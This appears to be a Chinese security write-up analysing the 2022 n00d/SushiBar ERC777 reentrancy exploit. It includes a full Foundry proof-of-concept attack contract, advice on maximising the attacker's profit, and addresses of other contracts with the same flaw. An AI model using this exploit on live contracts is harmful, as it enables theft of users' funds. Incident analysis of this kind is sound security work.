>**了解智能合约审计和最佳实践请**[点击查看文档](https://safful.com/) 

# 4700 万美元损失，Xn00d 合约漏洞攻击事件分析

# 基础知识

## **ERC777**

ERC777 是 ERC20 标准的高级代币标准，要提供了一些新的功能：运营商及钩子。

- 运营商功能。通过此功能能够允许第三方账户代表某一**合约或者地址**
  进行代币的发送交易
- 钩子功能。给该**合约或者地址**对其账户中的代币更多的控制权，防止运营商作恶，同时可以定义地址或者合约对某些代币进行控制以及提供拒绝接收某些代币功能

举个简单的栗子解释这两个功能(更多详细内容可阅读参考部分提供的链接)。
运营商功能：某区块链公司的老板使用某种基于 ERC777 的 A 代币作为工资发放，公司账户一共有 500 万的 A 代币，而经过人事的计算，本月共应发总工资为 200 万代币 A，那么公司老板就可以将财务的以太坊钱包地址作为运营商，并授权 200 万 A 代币的使用权限，那么财务便有权限使用公司地址 500 万中的 200 万 A 代币，并且对于公司来说，其余的金额是安全的。
钩子功能：可用来限制运营商的一些权限。如公司老板可以通过钩子规定运营商对公司账户中授权的 200 万 A 代币的走向做一个限制，规定只能转向某些已经标名备注了的地址，例如公司全体员工地址，以及限定单笔可发送的最大值等等。

# 基本知识

## 攻击的背景

攻击发生时间 2022-10-26 12:46:59
区块高度：15826380
攻击者： 0x8Ca72F46056D85DB271Dd305F6944f32A9870FF0
受害合约： 0x9C5A2A6431523fBBC648fb83137A20A2C1789C56
pair 合约： 0x5476DB8B72337d44A6724277083b1a927c82a389 为 n00dToken 与 WETH 的 pair 合约，为 uniswapV2 的 pair 合约。
**SushiBar ERC20 合约地址：0x3561081260186E69369E6C32F280836554292E08**
**n00dToken ERC777 合约地址： 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA**
这两个合约是什么关系？SushiBar 合约中有个 sushi 的合约变量，指向的是 n00dToken，

```
contract n00dToken is ERC777 {
    constructor(uint256 initialSupply, address[] memory defaultOperators)
        ERC777("n00dle", "n00d", defaultOperators)
    {
        _mint(msg.sender, initialSupply, "", "");
    }
}
```

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896456-00617041-95fa-427c-8153-76cc2649e32c.png#averageHue=%23ededed&clientId=uc65f94e3-75ad-4&from=paste&id=u3fd32d33&originHeight=466&originWidth=2842&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u11abf45b-d050-4503-ac9d-44385bb4266&title=)
**攻击最终获利多少呢？**
通过上图，从资产转移来看，最终的攻击效果是，黑客攻击了 SushiBar 合约，从 SushiBar 合约中提取了 42,752 价值的 n00dToken，用 42,752 的 n00dToken 在 Uniswap 中换了价值 29,388 的 WETH，最后将 29,388 的 WETH 换成了 ETH.

## **sushiBar 合约的 enter 函数代码**

功能：将 n00dToken 兑换成 bar 币。
输入：要兑换的 n00dToken 的数量。
输出：兑换出 bar 币到 msg.sender 中。
函数执行过程中
mint 出凭证，得到发送者的 noodToken。（注意这里的顺序，是先 mint，后得到 noodToken，这也是漏洞出现的原因）
调用 enter 后，sushiBar 合约会 mint 出一定数量的凭证，然后从 noodToken 中转移\_amount 数量的 noodToken 到 sushiBar 合约中。

```
// Enter the bar. Pay some SUSHIs. Earn some shares.
    function enter(uint256 _amount) public {
        uint256 totalSushi = sushi.balanceOf(address(this));
        uint256 totalShares = totalSupply();
        if (totalShares == 0 || totalSushi == 0) {
            _mint(msg.sender, _amount);
        } else {
            uint256 what = _amount.mul(totalShares).div(totalSushi);
            _mint(msg.sender, what);
        }
        sushi.transferFrom(msg.sender, address(this), _amount);
    }
```

// enter 的计算方式: uint barSwapCount = enterAmount.mul(bar.totalSupply()).div(n00d.balanceOf(BARADDR));
假设输入的 n00dToken 币数量为 n，可兑换出的 bar 的数量为 b，bar 合约的 totalSupply 为 T，bar 合约的 n00dToken 余额(n00d.balanceOf(BARADDR))为 B。则有
b=n\*T/B (1)
enter 完成后，T 的值和 B 的值都会发生变化，各自的变量函数如下：
T‘ = T + b (2)
B’ = B + n (3)

## **sushiBar 合约的 leave 函数代码**

功能：将 bar 币兑换成 n00dToken。
输入: 要兑换的 bar 币的数量
输出：兑换出 n00dToken 到 msg.sender

```
function leave(uint256 _share) public {
        uint256 totalShares = totalSupply();
        uint256 what = _share.mul(sushi.balanceOf(address(this))).div(totalShares);
        _burn(msg.sender, _share);
        sushi.transfer(msg.sender, what);
    }
}
```

// uint n00dSwapCount = (bar.balanceOf(address(this)).mul(n00d.balanceOf(BARADDR))).div(bar.totalSupply());
假设输入的 bar 币数量为 b’，可兑换出的 n00dToken 的数量为 n’，bar 合约的 totalSupply 为 T’，bar 合约的 n00dToken 余额(n00d.balanceOf(BARADDR))为 B’。则有
n’=b’\*B’/T’ (4)

## **SushiBar 与 n00dToken 的关系**

假设这样一个场景：用户在 enter 中使用 n 个 n00dToken，mint 出 b 个 bar 币。如果这个用户在 leave 中 burn 掉这 b 个 bar 币，可以得到多少个 n00dToken?
根据 4，得到的 n’=b’*B’/T’
因为 b’就是 mint 出来的，所以 b’=b
所以 n’=b’*B’/T’ ＝ bB’/T’ 将(2)代入 = bB’/(T+b) 将(1)换成 T=bB/n 代入 ＝ bB’/(bB/n + b)= n
所以使用 n 个 n00dToken mint 的 b 个 bar 币，直接 leave 掉的话，还会得到 n 个 n00dToken.

# 漏洞原理

漏洞关键点：

## 1.先 mint 后 transferFrom 的漏洞代码

漏洞出现在上面的 shiBar 合约的 enter 函数中,shiBar 合约中，主要是因为先执行了 mint，后执行了 transferFrom。

```
// Enter the bar. Pay some SUSHIs. Earn some shares.
    function enter(uint256 _amount) public {
        uint256 totalSushi = sushi.balanceOf(address(this));
        uint256 totalShares = totalSupply();
        if (totalShares == 0 || totalSushi == 0) {
            _mint(msg.sender, _amount);
        } else {
            uint256 what = _amount.mul(totalShares).div(totalSushi);
            _mint(msg.sender, what);
        }
        sushi.transferFrom(msg.sender, address(this), _amount);
    }
```

## 2. ERC777 的钩子函数。

n00dToken 使用了 ERC777 的规范，所以可以对 n00dToken 设置钩子函数，从而可以劫持 1 中的 transfrom，在钩子函数中再次调用 enter 实现重入。
💩 研究发现，先 mint 后 transFrom 的合约还是有很多的。比如下面的：
0x8798249c……1865ff4272
0xf7a038375……ff98e3790202b3
0x9257fb8fa……47403617b1938
0x36b679bd……dcb892cb66bd4cbb

# 漏洞分析

典型的重入漏洞，分析重入漏洞两板斧：

1. 找循环
2. 找代币变化。

找循环的调用关系
bar.enter()→bar.mint()→hack.tokensToSend→bar.enter→bar.mint()→hack.tokensToSend→…..
→n00dToken.transferFrom
标颜色的两个部分实现了循环调用，在循环调用完成后(这时已经调用了多次的 mint)才会调用 n00dToken.transferFrom 进行转账。
找代币变化
“吃了两碗的粉，只给了一碗的钱”。正常情况下，调用完一次 mint，就会转账，然后更新各类的 balance。但在重入的情况下，调用了第 1 次的 mint，没进行转账和 balance 更新，又调用第 2 次 mint，也没进行转账和 balance 更新，直到 n 次重入完成后，才进行第 1 次 mint 时的转账和 balance 更新，相同于第 2,3……,n 次时还是用第 1 次 mint 时的价格结的账。

## 1.循环调用

bar.enter()中先 mint 后 transfer，transfer 会调用到黑客的 tokensToSend,黑客在 tokensToSend 函数中再次调用 bar.enter()

## 2.代币变化

正常情况与重入状态下的代币的变化
💩 总结： 1.正常情况下，同等数量的 n00dToken 会 mint 出相同数量的 bar。 2.正常情况下和重入攻击情况下，最终的 n00d.balanceOf(bar)会相同，但 bar.supply 重入攻击情况下比正常情况下大。 因为重入中，最终的 transferFrom 都会执行，所以 n00d.balanceOf(bar)会相同。 而由于差价的改变，重入时多 mint 了 bar，所以 bar.supply 重入攻击情况下比正常情况下大。 3. 重入攻击的作用就是在拖延了 transferFrom 的执行，因为 transferFrom 会引起价格变化，拖延 transferFrom 的执行就相同于延缓了价格变化，用低价 mint 了后面几次。
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896437-e133109d-6ce0-4156-a63f-67a9112772aa.png#averageHue=%23eee7e6&clientId=uc65f94e3-75ad-4&from=paste&id=u067dd927&originHeight=1978&originWidth=1782&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u62e37881-ca02-4263-8bbc-393d854af6e&title=)
我们可以比较在当时的区块上，正常转账与重入攻击状态下转账的情况。

### 正常转账情况

不论是一性转入还是分三次转。最终 mint 出来的 bar 的数量是一致的,都为 14900396190115982310618。

- 一次性 entry 15110473474058799859170 = 3 \* 5036824491352933286390, 会 mint 出 sushiBar 数量为 14900396190115982310618
- 分三次，每次 entry 5036824491352933286390。可以看到每次使用相同的 n00dToken 都会兑换出相同的 bar，每次 mint 后都会引起 bar.supply 和 n00d.balanceOf(bar)的变化。三次共 mint 出的 bar 数量: 14900396190115982310618
  第一次 mint 出的 bar 数量: 4966798730038660770206
  第二次 mint 出的 bar 数量: 4966798730038660770206
  第三次 mint 出的 bar 数量: 4966798730038660770206 在这三次 mint 的过程中，bar.supply 和 n00d.balanceOf(bar)的变化情况如下：bar.supply: 7946728885657408588790 , n00d.ban: 8058768001881461618923Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 12913527615696069358996, n00d.ban: 13095592493234394905313Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 17880326345734730129202, n00d.ban: 18132416984587328191703Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 22847125075773390899408, n00d.ban: 23169241475940261478093 加粗的表示每次 mint 出来的 bar 的数量。棕色底的数值上面的两个加起来会等于下面的。绿色的数值上面的两个加起来会等于下面的。

### 重入攻击情况下

而在重入情况下。mint 出来的 bar 数量为 34100275953928728876790>14900396190115982310618。
在攻击中，一共输入 5036824491352933286390 进行了 3 次的 entry。共 mint 出 26153547068271320288007。
攻击中共调用了三次 entry，每次 mint 出来的数量如下：
before Enter]bar.supply: 7946728885657408588790 , n00d.ban: 8058768001881461618923
三次共 mint：26153547068271320288007
第一次 mint: 4966798730038660770207
第二次 mint: 8071106172719568973063
第三次 mint: 13115642165513090544737
bar.supply: 34100275953928728876790, n00d.ban: 23169241475940261478093
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896523-84d78e26-2be6-4c04-85af-d07c6e53c4c2.png#averageHue=%23eae3e2&clientId=uc65f94e3-75ad-4&from=paste&id=ud91eb4e3&originHeight=1458&originWidth=3196&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u572aaf29-6a88-4efb-bab4-c21e02390d6&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896487-edb0ba4e-44fa-413f-b432-6470f8ae3aa4.png#averageHue=%23eceae9&clientId=uc65f94e3-75ad-4&from=paste&id=u71db09f5&originHeight=1906&originWidth=3348&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uc6a5229e-60ca-4325-ad94-3a889dfe852&title=)

# 黑客攻击过程

调用过程，hackEOA 调用了 hackCon 的 fc7e3db8 函数。

1. 调用[[ERC1820Registry]](https://etherscan.io/address/0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer，这样在ERC777转账的钩子函数中会调用到注册的实现函数。
2. [[UniswapV2Pair]](https://etherscan.io/address/0x5476DB8B72337d44A6724277083b1a927c82a389).getReserves()。计算出pair合约中的n00dToken的储备量。
3. **n00dToke.approve(SushiBar,10073648982705866572782000)。根据 2 中计算出的**n00dToken 的储备量来进行授权，授权的数量为储备量\*500
4. 进行 uniswap 中的闪电贷功能。调用 uniswapV2Pair 的 swap。贷出 pair 合约中的所有的 n00dToken，使用 data 使用 0x333，会触发回调 hackCon 合约的 uniswapV2Call 函数
5. hackCon 合约的 uniswapV2Call 函数
   1. [[SushiBar]](https://etherscan.io/address/0x3561081260186E69369E6C32F280836554292E08).enter(_amount=5036824491352933286391)💩 为什么 enter 这个数字？比如第一次调用 sushiBar.enter 时，贷出的 n00dToken 数量为：20147297965411733145563，却只使用了 5036824491352933286391？因为 enter 时只拿出了 1/4 的进入 sushiBar.enter 那为什么拿 1/4 进入？
      另外的 2/3 用于钩子函数中 tokensToSend 中，在重入时的使用。每次重入执行 3 次 enter，每次使用 1/3 的贷款 enter 函数的主要操作主要有两个：1.mint 出凭证。2.从调用者获得 noodToken 的输入。这两个是按从 1 到 2 的顺序执行的。在执行动作 2 时会调用到 n00dToken 的 transferFrom，因为 n00dToken 是 ERC777，所以会调用到钩子函数，对应着 hackCon 的 tokensToSend 函数，而这个函数是黑客合约中自己写的代码，黑客在这个函数中又调用了 SushiBar 的 enter 函数。至此，这一步的调用过程从 enter 来，最终又调用 enter，一个循环就此产生，也就是重入攻击。在这里执行 3 次后，得到一大笔凭证。
   2. [[SushiBar]](https://etherscan.io/address/0x3561081260186E69369E6C32F280836554292E08).leave，会将凭证毁掉，取回n00dToken
   3. 将取回 n00dToken 归还闪电贷的本息。
6. 将此时的所有的 n00dToken 在 uniswap 中兑换成 WETH。
7. 循环执行上面的 2-5 步，重复 4 次。最终得到 20.82 个 WETH.

# 漏洞复现

参考代码(可联系获取)：

```
anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 15826379
```

代码中有 3 要要注意的变量，这三个变量根据重入漏洞和池子 reserve 的不同，追求利益最大化时要动态调整。

- uint ATTACK_COUNT = 4; // 记录共进行了几次攻击
- uint RECOUNT_PER_ATTACK = 2; // 记录每次攻击中执行几次重入操作
- enterAmount //在闪电贷调用函数中 uniswapV2Call，将贷入的资金分了几份，表示每份资金的数量，黑客攻击过程中使用的是 4,因为共执行了 3 次 enter,需要用到 3 份资金,这里就比 3 多分了一份。

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/interface.sol";
import "../src/SushiBar.sol";
import "forge-std/console2.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ContractTest is Test{
    using SafeMath for uint256;
    address constant N00DADDR = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
    address constant BARADDR = 0x3561081260186E69369E6C32F280836554292E08;

    IERC777 n00d = IERC777(N00DADDR);
    sushiBar bar = sushiBar(BARADDR);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint enterAmount = 0;
    uint ATTACK_COUNT = 4; //　记录共进行了几次攻击
    uint RECOUNT_PER_ATTACK = 2; //　记录每次攻击中执行几次重入操作
    uint curCountPerAttack = 0;
    uint n00dReserve;
    uint wethReserve;
    function setUp() public {
        // cheats.createSelectFork("mainnet", 15826379);
    }



    function testExploit() public{
        registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
        for (uint256 curAttCount = 0; curAttCount < ATTACK_COUNT; curAttCount++) { //　共执行4次攻击
            console2.log("\n[Attack times: %d]", curAttCount);
            curCountPerAttack = 0; // 每轮攻击之前，将重入的次数归0

            (n00dReserve, wethReserve, ) = pair.getReserves();
            console2.log("\nPair n00dReserve: %d, wethReserve: %d", n00dReserve, wethReserve);
            n00d.approve(BARADDR, ~uint(0));
            bytes memory data = "0x333";
            pair.swap(n00dReserve - 1, 0, address(this), data); //进行闪电贷，会来到自定义的uniswapV2Call函数执行
            uint amountIn = n00d.balanceOf(address(this));
            (uint n00dR, uint WETHR, ) = pair.getReserves();
            uint amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);
            n00d.transfer(address(pair), amountIn);
            pair.swap(0, amountOut, address(this), "");
            emit log_named_decimal_uint(
                "Attacker WETH profit after exploit",
                WETH.balanceOf(address(this)),
                18
            );
        }

    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{
        enterAmount = (n00d.balanceOf(address(this))-1) / 4; // 攻击过程中使用的是4,因为共执行了3次enter,需要用到3份资金,这里就比3多分了一份。

        // enter的计算方式: uint barSwapCount = enterAmount.mul(bar.totalSupply()).div(n00d.balanceOf(BARADDR));
        bar.enter(enterAmount);
        // leave的计算方式: _share.mul(sushi.balanceOf(address(this))).div(totalShares);
        // uint n00dSwapCount = (bar.balanceOf(address(this)).mul(n00d.balanceOf(BARADDR))).div(bar.totalSupply());

        bar.leave(bar.balanceOf(address(this)));

        uint flashReAmount = n00dReserve * 1000 / 997 + 1;
        n00d.transfer(address(pair), flashReAmount); //归还闪电贷本息
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if(to == address(bar) && curCountPerAttack < RECOUNT_PER_ATTACK){ // 攻击者执行了2次
            curCountPerAttack++;
            bar.enter(enterAmount);
        }
    }


    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {}

}
```

# 思考

## 1.如何利益最大化

那么思考一个问题：是不是共攻击 4 次，每次执行 2 次重入就能利益最大化呢？
不是的。
可以试验，如果共攻击 3 次，每次执行 3 次重入时，能获得的收益(21ETH)比实际攻击过程的收益(20.82ETH)更大一点，但整个池子基本也就是这么大的一个盈利了，不能高出太多了。
那么有没有办法能把提取出的币更高一些呢？这就涉及到 uniswapV2 合约的计算了。
**uniswap 的池子中最多可以取出多少？**
根据 routerV2 合约中的 getAmountOut 的计算函数的代码。

```
function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
```

假设是用 A 兑换 B，getAmountOut 是用来计算使用 amountIn 个 A 最终能兑换出的 B 的数量。
函数的输入输入:
amountIn: 用来兑换的 A 的数量，假设为 x。
reserveIn：A 的 reserve 储备量，假设为 X。
reserveOut：B 的 reserve 储备量，假设为 Y。
计算公式为：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872909336-2b5b2144-5dbe-46a2-9c59-0445f245767c.png#averageHue=%23ededed&clientId=uc65f94e3-75ad-4&from=paste&height=37&id=u49928b71&originHeight=74&originWidth=486&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9665&status=done&style=none&taskId=u9bb7bc77-7d33-41ce-9fe6-070a704ed19&title=&width=243)
根据这个公式，永远不可能把 Y 全部取出来，但会越来越接近 Y 的储备量。如果分多次取的话，后面取时，Y 的数量会起来越少，Y 的价格就会越来越高，同样 X 取出的 Y 就会越来越少，所以越到最后，取出 Y 所需要的 X 起来越多。
所以，回到这个问题的答案，那么有没有办法能把提取出的币更高一些呢？有的，攻击时只是从 0x5476DB8B72337d44A6724277083b1a927c82a389 的 pair 合约中借出 n00d 来进行攻击，如果可以从更多的地方想办法借更多的 n00d 代币，可能会使取出的币数量列多。

## 2.还有哪些有类似漏洞的代码

下面的代码中也有类似的问题，但因为对应的 n00d 合约使用的是 ERC20,并非 REC777,因此即使有重入的风险，但没法利用。
0x36b679bd64ed73dbfd88909cdcb892cb66bd4cbb Standard
0x8798249c2e607446efb7ad49ec89dd1865ff4272 SushiBar
